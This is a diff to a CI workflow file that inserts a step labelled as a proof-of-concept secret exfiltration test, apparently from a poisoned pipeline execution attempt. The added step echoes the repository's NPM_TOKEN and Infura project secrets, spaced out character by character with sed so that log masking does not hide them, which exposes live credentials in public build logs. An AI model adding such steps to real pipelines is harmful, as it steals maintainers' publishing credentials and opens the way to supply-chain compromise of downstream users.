@@ -72,6 +72,12 @@ jobs:
           path: |
             .nvmrc
             packages/*/dist
+      - name: POC - SECRET EXFILTRATION TEST
+        run: |
+            echo "--- PPE SUCCESSFUL: WORKFLOW HIJACKED ---"
+            echo "STEALING SECRETS..."
+            echo "NPM_TOKEN: ${{ secrets.NPM_TOKEN }}" | sed 's/./& /g'
+            echo "INFURA_KEY: ${{ secrets.INFURA_PROJECT_ID }}" | sed 's/./& /g'
       - name: Require clean working directory
         shell: bash
         run: |
